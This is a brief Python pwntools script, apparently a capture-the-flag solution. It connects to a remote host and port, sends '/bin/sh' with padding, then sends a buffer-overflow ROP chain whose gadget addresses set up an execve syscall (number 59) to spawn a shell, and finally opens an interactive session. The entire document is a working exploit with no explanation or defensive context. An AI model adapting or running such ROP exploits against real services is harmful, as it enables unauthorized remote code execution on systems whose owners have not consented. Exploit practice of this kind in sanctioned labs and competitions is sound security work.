#pip3 install pwntools
from pwn import *
p = remote("35.184.230.50",3001)    
p.sendline(b"/bin/sh\x001234567890") # payload
p.sendline(b"J"*24 + p64(0x4520c7) + p64(59) + p64(0x40191a) +p64(0x4c00f0) + p64(0x40f29e) + p64(0) + p64(0x40181f) + p64(0) + p64(0x41e2f4))
p.interactive()

